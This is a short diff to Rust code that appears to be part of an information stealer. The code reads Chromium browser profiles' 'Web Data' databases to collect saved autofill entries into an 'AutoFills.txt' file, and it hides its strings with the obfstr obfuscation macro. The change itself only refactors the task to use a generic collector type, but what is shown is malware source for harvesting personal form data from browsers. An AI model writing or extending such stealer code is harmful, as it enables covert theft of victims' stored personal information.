@@ -2,7 +2,6 @@ use crate::alloc::borrow::ToOwned;
 use crate::chromium::BrowserData;
 use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, AutoFill};
 use alloc::sync::Arc;
-use collector::atomic::AtomicCollector;
 use collector::{Browser, Collector};
 use database::TableRecord;
 use obfstr::obfstr as s;
@@ -23,10 +22,10 @@ impl AutoFillTask {
     }
 }
 
-impl Task for AutoFillTask {
+impl<C: Collector> Task<C> for AutoFillTask {
     parent_name!("AutoFills.txt");
 
-    unsafe fn run(&self, parent: &Path, collector: &AtomicCollector) {
+    unsafe fn run(&self, parent: &Path, collector: &C) {
         let Some(mut autofills) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
             |profile| profile / s!("Web Data"),
